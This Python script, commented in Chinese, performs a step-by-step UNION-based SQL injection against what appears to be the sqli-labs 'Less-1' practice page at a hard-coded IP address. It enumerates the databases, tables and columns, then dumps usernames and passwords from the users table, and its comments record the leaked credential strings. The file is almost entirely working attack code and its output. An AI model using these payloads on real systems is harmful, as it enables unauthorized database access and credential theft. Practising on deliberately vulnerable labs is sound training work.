# 数字型注入
import requests

# 查询数据库名和用户
# payload = '?id=-1\'UNION SELECT 1,DATABASE(),USER()\''
# 查询其他所有数据库
# payload = '?id=-1\' UNION SELECT 1,2,GROUP_CONCAT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA --+'
# 得到 information_schema,challenges,mysql,performance_schema,security
# 查表
# payload = '?id=-1\'UNION SELECT 1,2,GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() --+'
# 得到 emails,referers,uagents,users
# payload = "?id=-1\'UNION SELECT 1,2,GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'users' --+"
# 得到 id,username,password
payload = "?id=-1\' UNION SELECT 1,2,GROUP_CONCAT(id,username,password) from users --+"
# 得到 Your Password:1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity,6supermangenious,7batmanmob!le,8adminadmin,9admin1admin1,10admin2admin2,11admin3admin3,12dhakkandumbo,14admin4admin4
url = 'http://129.211.79.54:8801/Less-1/' + payload
s = requests.session()
r = s.get(url)

print(r.text)
